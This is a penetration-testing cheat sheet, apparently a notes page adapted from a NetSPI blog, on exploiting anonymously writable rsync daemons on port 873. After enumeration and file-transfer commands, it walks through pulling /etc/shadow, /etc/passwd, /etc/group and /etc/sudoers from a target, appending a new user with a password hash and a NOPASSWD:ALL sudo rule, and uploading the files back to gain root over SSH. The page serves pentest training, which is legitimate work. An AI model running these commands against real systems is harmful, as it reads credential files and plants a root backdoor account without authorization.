# 873 - RSYNC

example of Rsyncd.conf file that allows anonymous root access to the entire file system:

```
motd file = /etc/Rsyncd.motd
lock file = /var/run/Rsync.lock
log file = /var/log/Rsyncd.log
pid file = /var/run/Rsyncd.pid

[files]
path = /
comment = Remote file share.
uid = 0
gid = 0
read only = no
list = yes
```

## enumeration

```
nmap -p 873 192.168.0.1
```

List directory

```
rsync 192.168.1.171::
```

list directory ipv6&#x20;

```
rsync --list-only -a rsync://[dead:beef::0250:56ff:fe88:e5fa]:8730/var/
```

List sub directory contents

```
rsync 192.168.1.171::files
```

List directories and files recursively

```
rsync -r 192.168.1.171::files/tmp/
```

Download files

```
rsync 192.168.1.171::files/home/test/mypassword.txt .
```

Download folders

```
rsync -r 192.168.1.171::files/home/test/
```

Upload files

```
rsync ./myfile.txt 192.168.1.171::files/home/test
```

Upload folders

```
rsync -r ./myfolder 192.168.1.171::files/home/test
```

### Creating a New User through Rsync

If Rsync is configured to run as root and is anonymously accessible, it’s possible to create a new privileged Linux user by modifying the shadow, passwd, group, and sudoers files directly.

Note: The same general approach can be used for any vulnerability that provides full write access to the OS. A few other examples include NFS exports and uploading web shells running as root.

**Creating the Home Directory**\
Let’s start by creating our new user’s home directory.

```
# Create local work directories
mkdir demo
mkdir backup
cd demo

# Create new user’s home directory
mkdir ./myuser
rsync -r ./myuser 192.168.1.171::files/home
```

**Create the Shadow File Entry**\
The /etc/shadow file is the Linux password file that contains user information such as home directories and encrypted passwords. It is only accessible by root.

To inject a new user entry via Rsync you’ll have to:

1. Generate a password.
2. Create the line to inject.
3. Download /etc/shadow. (and backup)
4. Append the new user to the end of /etc/shadow
5. Upload / Overwrite the existing /etc/shadow

Note: Make sure to create a new user that doesn’t already exist on the system.&#x20;

Create Encrypted Password:

```
openssl passwd -crypt password123
```

Add New User Entry to /etc/shadow:

```
rsync -R 192.168.1.171::files/etc/shadow .
cp ./etc/shadow ../backup
echo "myuser:MjHKz4C0Z0VCI:17861:0:99999:7:::" >> ./etc/shadow
rsync ./etc/shadow 192.168.1.171::files/etc/
```

**Create Passwd File Entry**\
The /etc/passwd file is used to keep track of registered users that have access to the system. It does not contain encrypted password. It can be read by all users.

To inject a new user entry via Rsync you’ll have to:

1. Create the user entry to inject.
2. Download /etc/passwd. (and back it up so you can restore state later)
3. Append the new user entry to the end of passwd.
4. Upload / Overwrite the existing /etc/passwd

Note: Feel free to change to uid, but make sure it matches the value set in the /etc/group file.&#x20;

&#x20;In this case the UID/GUID are 1021.

Add New User Entry to /etc/passwd:

```
rsync -R 192.168.1.171::files/etc/passwd .
cp ./etc/passwd ../backup
echo "myuser:x:1021:1021::/home/myuser:/bin/bash" >> ./etc/passwd
rsync ./etc/passwd 192.168.1.171::files/etc/
```

**Create the Group File Entry**\
The /etc/group file is used to keep track of registered group information on the system. It does not contain encrypted password. It can be read by all users.

To inject a new user entry via Rsync you’ll have to:

1. Create the user entry to inject.
2. Download /etc/group. (and backup, just in case)
3. Append the new user entry to the end of group.
4. Upload / Overwrite the existing /etc/group file.

Note: Feel free to change to uid, but make sure it matches the value set in the /etc/passwd file.&#x20;

&#x20;In this case the UID/GUID are 1021.

Add New User Entry to /etc/group:

```
rsync -R 192.168.1.171::files/etc/group .
cp ./etc/group ../backup
echo "myuser:x:1021:" >> ./etc/group
rsync ./etc/group 192.168.1.171::files/etc/
```

**Create Sudoers File Entry**\
The /etc/sudoers file contains a list of users that are allowed to run commands as root using the sudo command. It can only be read by root. We are going to modify it to allow the new user to execute any command through sudo.

To inject a entry via Rsync you’ll have to:

1. Create the user entry to inject.
2. Download /etc/sudoers. (and backup, just in case)
3. Append the new user entry to the end of sudoers.
4. Upload / Overwrite the existing /etc/sudoers file.

Add New User Entry to /etc/sudoers:

```
rsync -R 192.168.1.171::files/etc/sudoers .
cp ./etc/sudoers ../backup
echo "myuser ALL=(ALL) NOPASSWD:ALL" >> ./etc/sudoers   
rsync ./etc/sudoers 192.168.1.171::files/etc/
```

Now you can simply log into the server via SSH using your newly created user and sudo sh to root!

source:

[https://blog.netspi.com/linux-hacking-case-studies-part-1-rsync/](https://blog.netspi.com/linux-hacking-case-studies-part-1-rsync/)
